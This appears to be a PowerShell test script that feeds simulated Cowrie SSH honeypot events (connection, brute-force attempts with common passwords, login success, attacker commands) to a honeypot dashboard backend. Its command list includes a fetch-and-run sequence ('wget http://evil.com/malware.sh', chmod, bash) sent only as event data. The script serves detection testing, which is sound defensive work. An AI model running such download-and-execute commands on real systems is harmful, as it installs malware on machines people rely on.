$baseUrl = "http://206.189.62.245:8000"
$secret = "default-shared-secret"
$attackerIp = "66.249.79." + (Get-Random -Minimum 10 -Maximum 200)

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host " HONEYPOT AI - LIVE ATTACK SIMULATION" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Target: $baseUrl" -ForegroundColor Yellow
Write-Host "Attacker IP: $attackerIp" -ForegroundColor Yellow
Write-Host "Open your frontend dashboard to watch this LIVE!" -ForegroundColor Green
Write-Host "Waiting 5 seconds before starting..."
Start-Sleep -Seconds 5

$passwords = @("root", "123456", "admin123", "password", "qwerty")

# 1. Start with an initial connection (Low severity)
Write-Host "[*] Sending initial connection..."
$event1 = @{
    eventid = "cowrie.session.connect"
    src_ip = $attackerIp
    dst_ip = "127.0.0.1"
    dst_port = 22
    protocol = "ssh"
    message = "New connection from $attackerIp"
    timestamp = (Get-Date).ToUniversalTime().ToString("o")
}
Invoke-WebRequest -Uri "$baseUrl/honeypot/events" -Method POST -Headers @{"X-Shared-Secret" = $secret} -Body (ConvertTo-Json $event1) -ContentType "application/json" | Out-Null
Write-Host " -> Attack should now appear on your LIVE DASHBOARD!" -ForegroundColor Green
Start-Sleep -Seconds 3

# 2. Ramp up severity with failed passwords (Medium -> High severity)
Write-Host "[*] Simulating Brute Force (Failed attempts)..."
foreach ($pwd in $passwords) {
    Write-Host "  -> Trying password: $pwd"
    $loginEvent = @{
        eventid = "cowrie.login.failed"
        src_ip = $attackerIp
        dst_ip = "127.0.0.1"
        message = "login attempt [$pwd] failed"
        password = $pwd
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
    }
    Invoke-WebRequest -Uri "$baseUrl/honeypot/events" -Method POST -Headers @{"X-Shared-Secret" = $secret} -Body (ConvertTo-Json $loginEvent) -ContentType "application/json" | Out-Null
    Start-Sleep -Seconds 2
}

# 3. Simulate success and suspicious commands (Extreme severity)
Write-Host "[*] Simulating successful breach and commands..."
$successEvent = @{
    eventid = "cowrie.login.success"
    src_ip = $attackerIp
    message = "login success"
    timestamp = (Get-Date).ToUniversalTime().ToString("o")
}
Invoke-WebRequest -Uri "$baseUrl/honeypot/events" -Method POST -Headers @{"X-Shared-Secret" = $secret} -Body (ConvertTo-Json $successEvent) -ContentType "application/json" | Out-Null
Start-Sleep -Seconds 2

$cmds = @("uname -a", "wget http://evil.com/malware.sh", "chmod +x malware.sh", "bash malware.sh")
foreach ($cmd in $cmds) {
    Write-Host "  -> Executing command: $cmd" -ForegroundColor Red
    $cmdEvent = @{
        eventid = "cowrie.command.input"
        src_ip = $attackerIp
        message = "command input: $cmd"
        input = $cmd
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
    }
    Invoke-WebRequest -Uri "$baseUrl/honeypot/events" -Method POST -Headers @{"X-Shared-Secret" = $secret} -Body (ConvertTo-Json $cmdEvent) -ContentType "application/json" | Out-Null
    Start-Sleep -Seconds 2
}

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Attack simulation complete!" -ForegroundColor Green
Write-Host "Wait 10 seconds for the AI to mark it as 'ended' and move it to History." -ForegroundColor Yellow
